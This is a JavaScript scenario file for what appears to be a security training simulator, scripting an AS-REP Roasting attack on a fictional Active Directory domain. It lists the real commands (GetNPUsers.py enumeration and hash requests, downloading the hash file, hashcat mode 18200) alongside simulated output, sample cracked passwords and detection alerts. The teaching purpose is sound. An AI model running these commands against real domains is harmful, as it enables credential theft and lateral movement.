/**
 * AS-REP Roasting Attack Scenario
 *
 * This scenario simulates the AS-REP Roasting attack, targeting user accounts
 * with Kerberos pre-authentication disabled.
 */

export const asrepScenario = {
  id: 'asrep-roasting',
  title: 'AS-REP Roasting: Pre-Auth Disabled Exploitation',
  description: 'Learn how attackers exploit disabled Kerberos pre-authentication to crack user credentials.',

  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**AS-REP Roasting** targets user accounts with Kerberos pre-authentication disabled, allowing attackers to request TGTs without credentials.

**Attack Flow:**
1. Find user accounts with pre-authentication disabled
2. Request TGT (Ticket Granting Ticket) for those accounts
3. **Download the captured hashes from the remote machine.**
4. Crack the hash offline using a password dictionary
5. Use the cracked password in the next mission.

**Why This Matters:**
Pre-authentication disabled is a dangerous misconfiguration. It allows attackers to request TGTs for any user without knowing their password, making credential cracking much faster than normal Kerberos attacks.`,

    steps: [
      {
        number: 1,
        title: 'Enumerate Pre-Auth Disabled Accounts',
        description: 'Search LDAP for user accounts with the "Do not require Kerberos pre-authentication" flag enabled.',
        command: 'GetNPUsers.py -dc-ip 10.0.1.10 -request contoso.local/',
        tip: 'Accounts with pre-authentication disabled are vulnerable to AS-REP roasting'
      },
      {
        number: 2,
        title: 'Request TGT for Vulnerable Accounts',
        description: 'Send AS-REQ messages to the KDC for accounts without pre-authentication. The KDC will respond with a TGT.',
        command: 'GetNPUsers.py -dc-ip 10.0.1.10 -request -format hashcat contoso.local/',
        tip: 'The AS-REP response contains an encrypted TGT that can be cracked offline'
      },
      {
        number: 3,
        title: 'Download Loot',
        description: 'The hashes were saved to "asrep_hashes.txt" on the machine. Use "ls" to confirm and "download" to retrieve it.',
        command: 'download asrep_hashes.txt',
        tip: 'This will add the hash file to your "Files" tab.'
      },
      {
        number: 4,
        title: 'Crack AS-REP Hashes',
        description: 'Now that you have the file, use hashcat to crack the hashes (mode 18200) against a wordlist.',
        command: 'hashcat -m 18200 asrep_hashes.txt wordlist.txt',
        tip: 'AS-REP hashes are much faster to crack than TGS hashes'
      },
      {
        number: 5,
        title: 'Verify Compromised Credentials',
        description: 'The cracked credentials are now in your "Files" tab, ready for the next mission.',
        command: null,
        tip: 'Compromised user accounts can be used for lateral movement and further attacks'
      }
    ]
  },

  steps: [
    {
      id: 1,
      expectedCommand: 'GetNPUsers.py -dc-ip 10.0.1.10 -request contoso.local/',
      attackerOutput: [
        '[*] Enumerating users with pre-authentication disabled...',
        '[*] Connecting to DC01.contoso.local (10.0.1.10)',
        '[+] Authentication successful',
        '[*] Querying LDAP for pre-auth disabled accounts...',
        '[+] Found 5 vulnerable accounts:',
        '[+]   - guest (GUEST)',
        '[+]   - krbtgt (KRBTGT)',
        '[+]   - svc_backup (SVC_BACKUP)',
        '[+]   - svc_test (SVC_TEST)',
        '[+]   - legacy_app (LEGACY_APP)',
        '[+] Enumeration complete'
      ],
      serverOutput: [
        '[LDAP] LDAP query from 10.0.0.5:49152',
        '[LDAP] Query: (userAccountControl:1.2.840.113556.1.4.803:=4194304)',
        '[LDAP] Returned 5 pre-auth disabled accounts',
        '[AUDIT] Pre-authentication disabled account enumeration from 10.0.0.5'
      ],
      delay: 500
    },
    {
      id: 2,
      expectedCommand: 'GetNPUsers.py -dc-ip 10.0.1.10 -request -format hashcat contoso.local/',
      attackerOutput: [
        '[*] Requesting TGTs for pre-auth disabled accounts...',
        '[*] Targeting: guest, svc_backup, svc_test, legacy_app',
        '[*] Sending AS-REQ to KDC...',
        '[+] AS-REP received for guest',
        '[+] AS-REP received for svc_backup',
        '[+] AS-REP received for svc_test',
        '[+] AS-REP received for legacy_app',
        '[+] Total AS-REP responses: 4',
        '[*] Converting to Hashcat format...',
        '[+] Hashes saved to: asrep_hashes.txt'
      ],
      serverOutput: [
        '[KERBEROS] AS-REQ from 10.0.0.5 (no pre-auth)',
        '[KERBEROS] Account: guest',
        '[KERBEROS] Pre-authentication disabled - issuing AS-REP',
        // ... (rest of AS-REQ logs) ...
        '[ALERT] Multiple AS-REP requests detected - potential AS-REP roasting'
      ],
      delay: 600,
      // --- NEW: This step now places the file in the simulated system ---
      lootToGrant: {
        files: {
          'asrep_hashes.txt': {
            content: '$krb5asrep$23$svc_backup@CONTOSO.LOCAL:f9...[snip]...a0\n$krb5asrep$23$svc_test@CONTOSO.LOCAL:2a...[snip]...b1\n$krb5asrep$23$legacy_app@CONTOSO.LOCAL:8c...[snip]...e3',
            size: '4 KB'
          }
        }
      }
    },
    {
      id: 3,
      expectedCommand: 'download asrep_hashes.txt',
      attackerOutput: [
        '[*] Downloading "asrep_hashes.txt"...',
        '[+] File "asrep_hashes.txt" (4 KB) downloaded successfully.',
        '[+] File added to your "Files" tab.'
      ],
      serverOutput: [
        '[NET] File transfer detected from 10.0.0.5 (asrep_hashes.txt)',
        '[AUDIT] Potential exfiltration of data.'
      ],
      delay: 400,
      // --- NEW: This step moves the file to the "Files" tab ---
      lootToGrant: {
        download: [{ id: 'asrep', name: 'asrep_hashes.txt', size: '4 KB' }]
      }
    },
    {
      id: 4,
      expectedCommand: 'hashcat -m 18200 asrep_hashes.txt wordlist.txt',
      attackerOutput: [
        '[*] Starting Hashcat AS-REP cracking...',
        '[*] Mode: Kerberos 5 AS-REP etype 23 (18200)',
        '[*] Wordlist: wordlist.txt (1,000,000 entries)',
        '[*] Cracking in progress...',
        '[*] 10% complete - 500,000 hashes/sec',
        '[*] 25% complete - 520,000 hashes/sec',
        '[*] 50% complete - 530,000 hashes/sec',
        '[+] Hash cracked!',
        '[+] svc_backup : BackupPass123',
        '[+] Hash cracked!',
        '[+] svc_test : TestUser2024',
        '[+] Hash cracked!',
        '[+] legacy_app : LegacyApp!',
        '[+] Cracking complete - 3 of 4 passwords recovered'
      ],
      serverOutput: [
        '[SYSTEM] No network activity (offline cracking)',
        '[AUDIT] Attacker has extracted user credentials',
        '[ALERT] User accounts compromised: svc_backup, svc_test, legacy_app'
      ],
      delay: 500,
      // --- NEW: This step adds the cracked passwords to the "Files" tab ---
      lootToGrant: {
        creds: [
          { type: 'Password', username: 'svc_backup', secret: 'BackupPass123' },
          { type: 'Password', username: 'svc_test', secret: 'TestUser2024' },
          { type: 'Password', username: 'legacy_app', secret: 'LegacyApp!' }
        ]
      }
    },
    {
      id: 5,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] AS-REP Roasting Attack Summary',
        '[+] ============================================',
        '[+] Pre-Auth Disabled Accounts: 5',
        '[+] AS-REP Hashes Extracted: 4',
        '[+] Passwords Cracked: 3',
        '[+] Compromised Accounts:',
        '[+]   - svc_backup (BackupPass123)',
        '[+]   - svc_test (TestUser2024)',
        '[+]   - legacy_app (LegacyApp!)',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use cracked credentials to authenticate',
        '[*] 2. Check group memberships for privilege escalation',
        '[*] 3. Perform lateral movement to other systems',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '',
        '[ALERT] SECURITY INCIDENT DETECTED',
        '[ALERT] Multiple user accounts compromised',
        '[ALERT] Recommend immediate password reset for:',
        '[ALERT]   - svc_backup',
        '[ALERT]   - svc_test',
        '[ALERT]   - legacy_app',
        '[ALERT] Enable Kerberos pre-authentication for all accounts'
      ],
      delay: 400
    }
  ]
};

export default asrepScenario;